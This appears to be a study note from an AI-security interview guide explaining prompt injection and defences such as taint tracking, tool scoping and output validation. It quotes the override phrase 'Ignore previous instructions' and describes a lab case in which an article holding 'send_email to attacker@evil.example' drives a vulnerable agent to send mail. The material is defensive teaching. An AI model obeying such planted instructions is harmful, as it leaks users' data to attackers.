# 2. What is prompt injection, and how would you prevent it?

![Prompt injection attack](../assets/02-prompt-injection.webp)

## The answer

Prompt injection is an attempt to **manipulate an AI application's behaviour through malicious instructions embedded in content the system processes**.

It comes in two forms:

- **Direct**: the user types it ("Ignore previous instructions and…").
- **Indirect**: it arrives inside content the model reads: a retrieved document, a web page, an email or a tool response. For example, an attacker plants instructions in a document a RAG application retrieves, trying to get the assistant to disclose confidential information.

A stronger system prompt alone is not the defence. The model can't reliably tell instructions from data, so assume it **will** sometimes follow injected text, and design so that doing so causes no harm:

1. **Trust-boundary enforcement**: track which content is untrusted (external documents, tool output) and treat it as data, never as authority.
2. **Strict tool permissions**: the agent can only call tools within its scope, with validated arguments.
3. **Output validation**: check model output before it reaches users or downstream systems.
4. **Sensitive-data controls**: the model can't leak what it was never given (see [RAG security](03-rag-security.md)).
5. **Testing**: injection test cases in the regression suite (see [CI/CD](09-ai-security-cicd.md)).

The key principle: **untrusted content must not be able to grant itself authority to execute privileged actions.**

## What I'd demonstrate

A prompt injection attack against a test application, followed by controls that prevent the intended unauthorised action.

In the lab, a support article containing `send_email to attacker@evil.example` makes the vulnerable agent send an email. In secure mode the policy engine sees the instruction arrived with **tainted** (external) context and denies the side-effecting call. The model was still fooled, but the action never happened.

```bash
cd lab && python -m unittest tests.test_prompt_injection -v
```

## Follow-ups to expect

- Why doesn't an input classifier or "guardrail model" solve this on its own?
- How do you track taint once untrusted text has been summarised by the model?
- What about attacks that only change the *answer* (misinformation) rather than trigger an action?
- How would you handle a legitimate workflow that genuinely needs to act on external content?
